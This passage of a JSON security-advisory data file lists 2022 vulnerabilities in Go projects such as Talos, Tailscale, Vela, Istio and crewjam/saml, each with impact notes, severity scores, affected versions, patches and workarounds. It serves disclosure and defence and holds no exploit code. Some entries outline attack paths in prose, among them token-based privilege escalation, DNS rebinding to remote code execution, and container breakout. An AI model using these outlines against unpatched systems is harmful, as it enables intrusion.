{"schema_version": "1.4.0", "id": "GHSA-7hgc-php5-77qq", "modified": "2022-09-19T20:23:28Z", "published": "2022-09-16T17:21:09Z", "aliases": ["CVE-2022-36103"], "summary": "Talos worker join token can be used to get elevated access level to the Talos API", "details": "### Impact\n\nTalos worker nodes use a join token to get accepted into the Talos cluster. A misconfigured Kubernetes environment may allow workloads to access the join token of the worker node. A malicious workload could then use the join token to construct a Talos CSR (certificate signing request). Due to improper validation while signing a worker node CSR, a Talos control plane node might issue a Talos certificate which allows full access to the Talos API to a worker node that presented a maliciously constructed CSR. Accessing the Talos API with full access on a control plane node might reveal sensitive information, which could allow full-level access to the cluster (Kubernetes and Talos PKI, etc.)\n\nIn order to exploit the weakness, a Kubernetes workload would need to access the join token, and then construct a specific kind of Talos CSR in order to obtain a privileged certificate. The Talos API join token is stored in the machine configuration on the worker node. When configured correctly, Kubernetes workloads do not have access to the machine configuration, and thus cannot access the token, nor acquire elevated privileges.\n\nIt is possible that users have misconfigured Kubernetes in such a way as to allow a workload to access the machine configuration and reveal the join token.  Misconfigurations that may allow the machine configuration to be accessed on a worker node by the Kubernetes workload are:\n\n* allowing a `hostPath` mount to mount the machine config directly from the host filesystem (`hostPath` mounts should not be allowed for untrusted workloads, and are disabled by default in recent versions of Talos.)\n* reading machine configuration from a cloud metadata server from Kubernetes pods with host networking (on cloud platforms, when machine config is stored in the cloud metadata server, and the cloud metadata server doesn't provide enough protection to prevent access from non-host workloads)\n\n### Patches\n\nThe problem was fixed in Talos 1.2.2.\n\n### Workarounds\n\nEnabling the [Pod Security Standards](https://www.talos.dev/v1.2/kubernetes-guides/configuration/pod-security/)  mitigates the vulnerability by denying `hostPath` mounts and host networking by default in the [baseline](https://kubernetes.io/docs/concepts/security/pod-security-standards/#baseline) policy. Talos enables Pod Security Admission plugin by default since [Talos v1.1.0](https://www.talos.dev/v1.1/introduction/what-is-new/#pod-security-admission).\n\nClusters that don't run untrusted workloads are not affected.\nClusters with correct Pod Security configurations which don't allow `hostPath` mounts, and secure access to cloud metadata server (or machine configuration is not supplied via cloud metadata server) are not affected.\n\n### References\n\n* [Talos v1.2.2 release](https://github.com/siderolabs/talos/releases/tag/v1.2.2)\n* [Fixing commit](https://github.com/siderolabs/talos/commit/9eaf33f3f274e746ca1b442c0a1a0dae0cec088f)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Email us at [security@siderolabs.com](mailto:security@siderolabs.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/talos-systems/talos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/siderolabs/talos/security/advisories/GHSA-7hgc-php5-77qq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36103"}, {"type": "WEB", "url": "https://github.com/siderolabs/talos/commit/9eaf33f3f274e746ca1b442c0a1a0dae0cec088f"}, {"type": "PACKAGE", "url": "https://github.com/siderolabs/talos"}, {"type": "WEB", "url": "https://github.com/siderolabs/talos/releases/tag/v1.2.2"}], "database_specific": {"cwe_ids": ["CWE-732", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T17:21:09Z", "nvd_published_at": "2022-09-13T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m74x-fxjh-3qh9", "modified": "2022-11-30T21:22:44Z", "published": "2022-11-19T00:30:55Z", "aliases": ["CVE-2022-38871"], "summary": "Free5gc vulnerable to uncontrolled resource consumption", "details": "In Free5gc v3.0.5, the AMF breaks due to malformed NAS messages.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/free5gc/free5gc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}], "database_specific": {"last_known_affected_version_range": "< 3.0.5"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-38871"}, {"type": "WEB", "url": "https://github.com/free5gc/free5gc/issues/198"}, {"type": "PACKAGE", "url": "https://github.com/free5gc/free5gc"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-11-30T21:22:44Z", "nvd_published_at": "2022-11-18T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vqp6-rc3h-83cp", "modified": "2022-11-21T22:34:00Z", "published": "2022-11-21T22:34:00Z", "aliases": ["CVE-2022-41924"], "summary": "Tailscale Windows daemon is vulnerable to RCE via CSRF", "details": "A vulnerability identified in the Tailscale Windows client allows a malicious website to reconfigure the Tailscale daemon `tailscaled`, which can then be used to remotely execute code.\n\n**Affected platforms:** Windows\n**Patched Tailscale client versions:** v1.32.3 or later, v1.33.257 or later (unstable)\n\n### What happened?\nIn the Tailscale Windows client, the local API was bound to a local TCP socket, and communicated with the Windows client GUI in cleartext with no Host header verification. This allowed an attacker-controlled website visited by the node to rebind DNS to an attacker-controlled DNS server, and then make local API requests in the client, including changing the coordination server to an attacker-controlled coordination server.\n\n### Who is affected?\nAll Windows clients prior to version v.1.32.3 are affected.\n\n### What should I do?\nIf you are running Tailscale on Windows, upgrade to v1.32.3 or later to remediate the issue.\n\n### What is the impact?\nAn attacker-controlled coordination server can send malicious URL responses to the client, including pushing executables or installing an SMB share. These allow the attacker to remotely execute code on the node.\n\nReviewing all logs confirms this vulnerability was not triggered or exploited. \n\n### Credits\nWe would like to thank [Emily Trau](https://github.com/emilytrau) and [Jamie McClymont (CyberCX)](https://twitter.com/JJJollyjim) for reporting this issue. Further detail is available in [their blog post](https://emily.id.au/tailscale).\n\n### References\n* [TS-2022-004](https://tailscale.com/security-bulletins/#ts-2022-004)\n* [Researcher blog post](https://emily.id.au/tailscale)\n\n### For more information\nIf you have any questions or comments about this advisory, [contact Tailscale support](https://tailscale.com/contact/support/).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "tailscale.com"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.32.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/tailscale/tailscale/security/advisories/GHSA-vqp6-rc3h-83cp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41924"}, {"type": "WEB", "url": "https://emily.id.au/tailscale"}, {"type": "PACKAGE", "url": "https://github.com/tailscale/tailscale"}, {"type": "WEB", "url": "https://github.com/tailscale/tailscale/releases/tag/v1.32.3"}, {"type": "WEB", "url": "https://tailscale.com/security-bulletins/#ts-2022-004"}], "database_specific": {"cwe_ids": ["CWE-346", "CWE-352"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-11-21T22:34:00Z", "nvd_published_at": "2022-11-23T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5m7g-pj8w-7593", "modified": "2022-11-18T06:13:43Z", "published": "2022-11-09T19:17:21Z", "aliases": ["CVE-2022-39395"], "summary": "Vela Insecure Defaults", "details": "### Impact\nSome current default configurations for Vela allow exploitation and container breakouts.\n\n#### Default Privileged Images\n\nRunning Vela plugins as privileged Docker containers allows a malicious user to easily break out of the container and gain access to the worker host operating system. On a fresh install of Vela without any additional configuration, the `target/vela-docker` plugin will run as a privileged container, even if the Vela administrators did not intend to allow for any privileged plugins, and even if the `vela.yml` configuration file does not use the `privileged = True` flag.\n\nPrivileged containers permit trivial breakouts, which can pose significant risk to the environment in which Vela is running.\n\n#### Default Allowed Repositories\n\nOn a fresh install of Vela, anyone with a GitHub account (or other enabled source control management solution) is allowed to enable a repository within Vela and run builds. This means that, if a Vela instance is accessible to the public, a third party could add their own malicious repos to the Vela instance and run arbitrary code.\n\nAn example of a publicly accessible Vela instance would be one not protected behind a VPN. Whether Vela is publicly accessible depends on how Vela is set up, NOT how it is connected to GitHub.\n\n#### Default Enabled Events allows Pull Requests\n\nBy default, Vela currently enables pull request events when a repository is Vela-enabled. Unless this default was changed when enabling each repository, anyone who can issue a pull request against a repository can trigger a Vela job.\n\nThis not only permits a third party to run arbitrary code in a Vela environment, but also poses an additional risk when secrets within Vela are configured to be available in pull requests, permitting anyone with access to create pull requests to access these secrets.\n\n### Patches\n\nUpgrade to 0.16.0 or later. After upgrading, Vela administrators will need to explicitly change the default settings to configure Vela as desired.\n\nSome of the fixes will interrupt existing workflows and will require Vela administrators to modify default settings (see release notes for more information). However, not applying the patch (or workarounds) will continue existing risk exposure.\n\n### Workarounds\n\n#### Default Privileged Images\n\nInstead of upgrading, the Vela administrators can adjust the worker's `VELA_RUNTIME_PRIVILEGED_IMAGES` setting to be explicitly empty:\n\n`VELA_RUNTIME_PRIVILEGED_IMAGES=\"\"`\n\nBy assigning `VELA_RUNTIME_PRIVILEGED_IMAGES` to an empty value it disallows any images from running as privileged containers in Vela.\n\n#### Default Allowed Repositories\n\nInstead of upgrading, the Vela administrators can leverage the `VELA_REPO_ALLOWLIST` setting on the server component to restrict access to a list of repositories that are allowed to be enabled.\n\nBy changing it from the default empty list (currently interpreted by Vela as \"all repositories\") to a list explicitly allowing specific repositories, Vela administrators can control what repositories are allowed to be enabled in Vela.\n\nVela's current default list of approved repositories that can be added to a Vela instance is an empty list. However this is currently interpreted as allowing all repositories.\n\nIn the updated version, a null value (the empty list) will be interpreted as permitting no repositories to be added to a Vela instance.\n\n#### Default Enabled Events allows Pull Requests\n\nAudit enabled repositories and disable `pull_requests` if they are not needed.\n\nInstead of upgrading, the pull request trigger can be disabled on a per-repository basis.\n\nAdditional protection can be provided by preventing unauthorized users from submitting pull requests in GitHub (or other source control management solution).\n\n### Residual Risk\n\n#### Default Privileged Images\n\nAfter applying the update, any repos that Vela administrators manually define as \"trusted repos\" will be able to run the manually-specified images that are allowed to run as privileged. Those repos will continue to be vulnerable to breakout, but applying the update will help protect against the risk of trivial breakout arising from an image running as a privileged container.\n\nThe recommendation is to utilize plugins that do not require privileged capabilities.\n\nFor example, utilize `target/vela-kaniko` instead of `target/vela-docker` as the Kaniko plugin does not require privileged access.\n\n#### Default Allowed Repositories\n\nApplying this update (or workaround) will protect against the risk of Vela interpreting the default empty list of approved repositories as \"all repositories\" rather than \"no repositories\" (the current default).\n\n#### Default Enabled Events allows Pull Requests\n\nSince this change only impacts newly enabled repositories, the update will not address the risk to existing enabled repositories resulting from Vela enabling pull request events when a repository is Vela-enabled.\n\nAdditionally, this change only impacts defaults; users can still configure their repositories to allow pull requests as triggering events.\n\nIn order to monitor risk going forward, refer to the `Workaround` section with the heading `Default Enabled Events allows Pull Requests`.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [vela@target.com](mailto:vela@target.com)\n\nAffected products: `go-vela/worker`, `go-vela/server`, `go-vela/ui`, `go-vela/documentation`", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-vela/server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.16.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/go-vela/worker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.16.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/go-vela/server/security/advisories/GHSA-5m7g-pj8w-7593"}, {"type": "WEB", "url": "https://github.com/go-vela/ui/security/advisories/GHSA-xf39-98m2-889v"}, {"type": "WEB", "url": "https://github.com/go-vela/worker/security/advisories/GHSA-2w78-ffv6-p46w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39395"}, {"type": "WEB", "url": "https://github.com/go-vela/server/commit/05558ee99d70f7d6f83bed7c8f78ac0b35fa26f4"}, {"type": "WEB", "url": "https://docs.docker.com/engine/security/#docker-daemon-attack-surface"}, {"type": "WEB", "url": "https://github.com/go-vela/server/releases/tag/v0.16.0"}, {"type": "WEB", "url": "https://github.com/go-vela/ui/releases/tag/v0.17.0"}, {"type": "WEB", "url": "https://github.com/go-vela/worker/releases/tag/v0.16.0"}, {"type": "WEB", "url": "https://go-vela.github.io/docs/installation/server/reference/#vela_repo_allowlist"}, {"type": "WEB", "url": "https://go-vela.github.io/docs/installation/worker/reference/#vela_runtime_privileged_images"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-11-09T19:17:21Z", "nvd_published_at": "2022-11-10T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6c6p-h79f-g6p4", "modified": "2022-11-09T22:07:01Z", "published": "2022-11-09T22:07:01Z", "aliases": ["CVE-2022-39388"], "summary": "Istio may allow identity impersonation if user has localhost access", "details": "### Impact\n\nUser can impersonate any workload identity within the service mesh if they have localhost access to the Istiod control plane.\n\n### Patches\n1.15.3\n\n### Workarounds\nNo. If using 1.15.2 please upgrade to 1.15.3 or later.\n\n### References\nNone at this time.\n\n### For more information\nIf you have any questions or comments about this advisory, please email us at [istio-security-vulnerability-reports@googlegroups.com](mailto:istio-security-vulnerability-reports@googlegroups.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/istio/istio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.15.0-beta.0"}, {"fixed": "1.15.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/istio/istio/security/advisories/GHSA-6c6p-h79f-g6p4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39388"}, {"type": "WEB", "url": "https://github.com/istio/istio/commit/346260e5115e9fbc65ba8a559bc686e6ca046a32"}, {"type": "WEB", "url": "https://github.com/istio/istio/commit/9a643e270421560afb2630e00f76d46a55499df9"}, {"type": "PACKAGE", "url": "https://github.com/istio/istio"}, {"type": "WEB", "url": "https://istio.io/latest/news/releases/1.15.x/announcing-1.15.3/"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-11-09T22:07:01Z", "nvd_published_at": "2022-11-10T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3gfj-fxx4-f22w", "modified": "2022-11-10T14:32:09Z", "published": "2022-11-08T22:31:25Z", "aliases": ["CVE-2022-39352"], "summary": "OpenFGA Authorization Bypass", "details": "### Overview\nDuring our internal security assessment, it was discovered that OpenFGA versions v0.2.4 and prior are vulnerable to authorization bypass under certain conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you are using `openfga/openfga` version v0.2.4 or prior, and have tuples where the `user` field is set to a `userset` e.g. `folder:test#owner`, and the tuple's relation is used on the right-hand side of a `from` statement.\n\n### How to fix that?\nUpgrade to version 0.2.5.\n\n### Backward Compatibility\nThis update is not backward compatible.\nAny tuples where the `user` field is set to a `userset`, and the tuple's relation is used on the right-hand side of a `from` statement have to be rewritten.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openfga/openfga"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.5"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.2.4"}}], "references": [{"type": "WEB", "url": "https://github.com/openfga/openfga/security/advisories/GHSA-3gfj-fxx4-f22w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39352"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/commit/776e80505e8d184b2286acc8268d8d74f36a9984"}, {"type": "PACKAGE", "url": "https://github.com/openfga/openfga"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/releases/tag/v0.2.5"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-11-08T22:31:25Z", "nvd_published_at": "2022-11-08T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gw2g-hhc9-wgjh", "modified": "2022-11-21T23:53:03Z", "published": "2022-11-16T12:00:20Z", "aliases": ["CVE-2022-3920"], "summary": "Missing Authorization in HashiCorp Consul", "details": "HashiCorp Consul and Consul Enterprise 1.13.0 up to 1.13.3 do not filter cluster filtering's imported nodes and services for HTTP or RPC endpoints used by the UI. Fixed in 1.14.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.14.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3920"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/706866fa0016b0aa302679f9c648859050d19b2e"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-28-consul-cluster-peering-leaks-imported-nodes-services-information/46946"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-11-21T23:53:03Z", "nvd_published_at": "2022-11-16T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5jph-wrq7-v9hf", "modified": "2022-11-26T20:18:04Z", "published": "2022-11-23T06:30:24Z", "aliases": ["CVE-2022-4044"], "summary": "Denial of service in Mattermost", "details": "A denial-of-service vulnerability in Mattermost allows an authenticated user to crash the server via multiple large autoresponder messages.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.2.0"}, {"fixed": "7.2.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.3.0"}, {"fixed": "7.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4044"}, {"type": "WEB", "url": "https://hackerone.com/reports/1680241"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-11-23T22:17:54Z", "nvd_published_at": "2022-11-23T06:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j2jp-wvqg-wc2g", "modified": "2022-12-01T22:13:04Z", "published": "2022-11-29T23:55:54Z", "aliases": ["CVE-2022-41912"], "summary": "crewjam/saml vulnerable to signature bypass via multiple Assertion elements due to improper authentication", "details": "### Impact\n\nThe crewjam/saml go library is vulnerable to an authentication bypass when processing SAML responses containing multiple Assertion elements.\n\n### Patches\n\nThis issue has been corrected in version 0.4.9.\n\n### Credit\n\nThis issue was reported by Felix Wilhelm from Google Project Zero.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crewjam/saml"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/crewjam/saml/security/advisories/GHSA-j2jp-wvqg-wc2g"}, {"type": "WEB", "url": "https://github.com/prometheus/exporter-toolkit/security/advisories/GHSA-7rg2-cxvp-9p7p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41912"}, {"type": "WEB", "url": "https://github.com/crewjam/saml/commit/aee3fb1edeeaf1088fcb458727e0fd863d277f8b"}, {"type": "PACKAGE", "url": "https://github.com/crewjam/saml"}, {"type": "WEB", "url": "https://github.com/crewjam/saml/releases/tag/v0.4.9"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1129"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/170356/crewjam-saml-Signature-Bypass.html"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-11-29T23:55:54Z", "nvd_published_at": "2022-11-28T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hc82-w9v8-83pr", "modified": "2022-11-18T18:50:01Z", "published": "2022-11-18T18:50:01Z", "aliases": ["CVE-2022-39389"], "summary": "Witness Block Parsing DoS Vulnerability ", "details": "### Impact\n\nAll lnd nodes before version `v0.15.4` are vulnerable to a block parsing bug that can cause a node to enter a degraded state once encountered. In this degraded state, nodes can continue to make payments and forward HTLCs, and close out channels. Opening channels is prohibited, and also on chain transaction events will be undetected. \n\nThis can cause loss of funds if a CSV expiry is researched during a breach attempt or a CLTV delta expires forgetting the funds in the HTLC. \n\n### Patches\n\nA patch is available starting with lnd `v0.15.4`. \n\n### Workarounds\n\nNodes can use the `lncli updatechanpolicy` RPC call to increase their CLTV value to a very high amount or increase their fee policies. This will prevent nodes from routing through your node, meaning that no pending HTLCs can be present. \n\n### References\n\nhttps://github.com/lightningnetwork/lnd/issues/7096\n\nhttps://github.com/lightningnetwork/lnd/releases/tag/v0.15.4-beta\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/lightningnetwork/lnd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.15.4-beta"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/lightningnetwork/lnd/security/advisories/GHSA-hc82-w9v8-83pr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39389"}, {"type": "WEB", "url": "https://github.com/lightningnetwork/lnd/issues/7096"}, {"type": "WEB", "url": "https://github.com/lightningnetwork/lnd/pull/7098"}, {"type": "PACKAGE", "url": "https://github.com/lightningnetwork/lnd"}, {"type": "WEB", "url": "https://github.com/lightningnetwork/lnd/releases/tag/v0.15.4-beta"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-11-18T18:50:01Z", "nvd_published_at": "2022-11-17T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jr77-8gx4-h5qh", "modified": "2022-11-16T00:04:13Z", "published": "2022-11-11T12:00:33Z", "aliases": ["CVE-2022-41719"], "summary": "MessagePack for Golang subject to DoS via Unmarshal panic", "details": "Unmarshal can panic on some inputs, possibly allowing for denial of service attacks. This issue has been patched in version 2.1.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/shamaton/msgpack/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41719"}, {"type": "WEB", "url": "https://github.com/shamaton/msgpack/issues/31"}, {"type": "WEB", "url": "https://github.com/shamaton/msgpack/pull/32"}, {"type": "PACKAGE", "url": "https://github.com/shamaton/msgpack"}, {"type": "WEB", "url": "https://github.com/shamaton/msgpack/releases/tag/v2.1.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0972"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-11-16T00:04:13Z", "nvd_published_at": "2022-11-10T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7wg4-8m5p-hrfg", "modified": "2023-05-22T18:33:41Z", "published": "2022-11-10T12:01:03Z", "aliases": ["CVE-2022-3866"], "summary": "HashiCorp Nomad vulnerable to non-sensitive metadata exposure", "details": "HashiCorp Nomad and Nomad Enterprise 1.4.0 up to 1.4.1 workload identity token can list non-sensitive metadata for paths under `nomad/` that belong to other jobs in the same namespace. Fixed in 1.4.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3866"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/commit/3b24f26603e2b116ba324101afa8a7e3a7a769a5"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-25-nomad-s-workload-identity-token-can-list-non-sensitive-metadata-for-nomad-paths/46167"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": ["CWE-668"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-11-10T23:51:44Z", "nvd_published_at": "2022-11-10T06:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cvh4-cjc9-84qm", "modified": "2022-12-02T22:20:46Z", "published": "2022-11-29T21:30:25Z", "aliases": ["CVE-2022-3751"], "summary": "owncast is vulnerable to SQL Injection", "details": "SQL Injection in GitHub repository owncast/owncast prior to 0.0.13.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/owncast/owncast"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3751"}, {"type": "WEB", "url": "https://github.com/owncast/owncast/pull/2257"}, {"type": "WEB", "url": "https://github.com/owncast/owncast/commit/23b6e5868d5501726c27a3fabbecf49000968591"}, {"type": "PACKAGE", "url": "https://github.com/owncast/owncast"}, {"type": "WEB", "url": "https://huntr.dev/bounties/a04cff99-5d53-45e5-a882-771b0fad62c9"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-02T22:20:46Z", "nvd_published_at": "2022-11-29T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v42f-hq78-8c5m", "modified": "2022-11-26T20:03:44Z", "published": "2022-11-23T09:30:24Z", "aliases": ["CVE-2022-4045"], "summary": "Denial of service in Mattermost", "details": "A denial-of-service vulnerability in the Mattermost allows an authenticated user to crash the server via multiple requests to one of the API endpoints which could fetch a large amount of data.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.2.0"}, {"fixed": "7.2.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.3.0"}, {"fixed": "7.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4045"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}, {"type": "PACKAGE", "url": "https://pkg.go.dev/github.com/mattermost/mattermost-server"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-11-23T22:20:17Z", "nvd_published_at": "2022-11-23T07:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7fxj-fr3v-r9gj", "modified": "2022-11-24T01:13:44Z", "published": "2022-11-04T19:01:17Z", "aliases": ["CVE-2022-3023"], "summary": "TiDB vulnerable to Use of Externally-Controlled Format String", "details": "TiDB server (importer CLI tool) prior to version 6.4.0 & 6.1.3 is vulnerable to data source name injection. The database name for generating and inserting data into a database does not properly sanitize user input which can lead to arbitrary file reads.\"", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pingcap/tidb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "6.1.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pingcap/tidb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.2.0"}, {"last_affected": "6.4.0-alpha1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3023"}, {"type": "WEB", "url": 